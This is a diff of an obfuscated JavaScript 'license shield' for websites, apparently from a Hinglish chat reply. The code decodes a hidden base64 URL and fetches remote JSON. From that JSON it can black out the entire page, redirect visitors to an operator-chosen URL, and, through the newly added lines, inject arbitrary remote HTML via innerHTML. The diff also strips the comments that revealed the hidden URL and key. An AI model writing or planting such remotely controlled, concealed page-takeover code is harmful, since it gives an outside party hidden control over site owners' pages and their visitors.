@@ -11,8 +11,9 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 ```html
 <div id="_x_ov" style="display:none;position:fixed;inset:0;background:#000;z-index:2147483647;color:#fff;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;">
     <div style="padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
-        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;"></h1>
-        <p id="_x_b" style="color:#bbb;margin-top:20px;font-size:17px;line-height:1.6;"></p>
+        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;margin-bottom:20px;"></h1>
+        <div id="_x_b" style="color:#bbb;font-size:17px;line-height:1.6;"></div>
+        
         <div id="_x_tm_w" style="margin-top:25px;border-top:1px solid #222;padding-top:20px;display:none;">
             <p style="color:#666;font-size:14px;">Redirecting automatically in <span id="_x_tm" style="color:#fff;font-weight:bold;font-size:18px;">--</span> seconds...</p>
         </div>
@@ -21,9 +22,7 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 
 <script>
 (function(){
-    // URL: https://fahadtech8.github.io/license-manager/controller.json
     const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
-    // Key: FAHAD-786
     const _k = atob("RkFIQUQtNzg2"); 
 
     async function _v8_core(){
@@ -32,30 +31,41 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
             const r = await fetch(_u + '?v=' + Date.now());
             if(!r.ok) return;
             const d = await r.json();
-            
-            // Yahan keys ko aapke JSON ke mutabiq fix kiya gaya hai
             const m = d['licenses'] ? d['licenses'][_k] : null; 
             const n = new Date().toISOString().split('T')[0];
 
-            // Analytics logic
-            if(d['settings']?.['analytics_id']){
-                let g=document.createElement('script'); g.async=true; g.src='https://www.googletagmanager.com/gtag/js?id='+d['settings']['analytics_id'];
-                document.head.appendChild(g); window.dataLayer=window.dataLayer||[];
-                function gtag(){dataLayer.push(arguments);} gtag('js',new Date()); gtag('config',d['settings']['analytics_id']);
-            }
-
             let err = null;
-            if(!m) err = d['msg_invalid'];
-            else if(m['authorized_target']?.length > 0 && !m['authorized_target'].includes(h)) err = d['msg_domain_mismatch'];
-            else if(m['expiry'] && n > m['expiry']) err = d['msg_expired'];
+            let forceShow = false;
+
+            // --- STEP 1: Check if Custom Code is Force Enabled ---
+            if(m && m['custom_code'] && m['custom_code']['enabled'] === true){
+                forceShow = true;
+                err = "CUSTOM_ACTIVE"; // Trigger display
+            } 
+            // --- STEP 2: Normal License Checks (only if custom is false) ---
+            else {
+                if(!m) err = d['msg_invalid'];
+                else if(m['authorized_target']?.length > 0 && !m['authorized_target'].includes(h)) err = d['msg_domain_mismatch'];
+                else if(m['expiry'] && n > m['expiry']) err = d['msg_expired'];
+            }
 
             if(err){
                 document.body.style.overflow = 'hidden';
                 document.getElementById('_x_h').innerHTML = d['title'] || "Security Shield";
-                document.getElementById('_x_b').innerHTML = err;
+                
+                const messageBox = document.getElementById('_x_b');
+                
+                // Agar forceShow true hai toh stylish code dikhao
+                if(forceShow){
+                    messageBox.innerHTML = m['custom_code']['code'];
+                } else {
+                    messageBox.innerHTML = err;
+                }
+
                 o.style.display = 'flex';
                 
-                if(d['settings']?.['redirect_enabled']){
+                // Redirect settings
+                if(d['settings']?.['redirect_enabled'] && !forceShow){ // Custom code pe redirect band rakha hai
                     const tw = document.getElementById('_x_tm_w'), ts = document.getElementById('_x_tm');
                     tw.style.display = 'block';
                     let s = d['settings']['redirect_delay_sec'] || 20;
@@ -63,14 +73,11 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
                     let it = setInterval(() => {
                         s--;
                         if(ts) ts.innerText = s;
-                        if(s <= 0){
-                            clearInterval(it);
-                            window.location.href = d['settings']['redirect_url'];
-                        }
+                        if(s <= 0){ clearInterval(it); window.location.href = d['settings']['redirect_url']; }
                     }, 1000);
                 }
             }
-        } catch(e) { console.log("Shield Active"); }
+        } catch(e) { console.error(e); }
     }
     _v8_core();
 })();
